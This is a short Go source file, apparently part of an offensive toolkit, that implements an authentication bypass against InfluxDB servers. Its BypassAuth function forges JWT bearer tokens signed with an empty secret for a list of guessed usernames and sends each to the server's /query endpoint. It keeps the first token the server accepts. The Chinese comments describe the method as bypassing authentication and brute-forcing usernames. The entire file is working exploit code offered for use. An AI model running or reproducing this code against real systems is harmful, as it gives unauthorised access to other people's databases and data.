package influxdb

import (
	"errors"
	"fmt"
	"io/ioutil"
	"net/http"
	"siusiu/pkg/jwt"
	"strings"

	"github.com/sirupsen/logrus"
)

//Client 客户端
type Client struct {
	Host  string
	Port  int
	Token string
}

//NewClient 构造函数
func NewClient(host string, port int) *Client {
	return &Client{
		Host: host,
		Port: port,
	}
}

//BypassAuth 绕过认证
func (c *Client) BypassAuth(usernames []string) (token string, err error) {
	url := fmt.Sprintf(`http://%s:%d/query?q=show+users`, c.Host, c.Port)
	request, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		logrus.Error("http.NewRequest failed,err:", err)
		return "", err
	}
	for i := range usernames {
		fmt.Println("正在尝试用户名:", usernames[i])
		token, err := jwt.GenToken(usernames[i], "")
		if err != nil {
			logrus.Error("jwt.GenToken failed,err:", err)
			return "", err
		}
		request.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
		resp, err := http.DefaultClient.Do(request)
		if err != nil {
			logrus.Error("http.DefaultClient.Do failed,err:", err)
			return "", err
		}
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return "", err
		}
		fmt.Println(string(body))
		if strings.Contains(string(body), "user not found") {
			continue
		} else {
			c.Token = token
			return token, nil
		}
	}

	return "", errors.New("爆破失败,需要更多用户名")
}
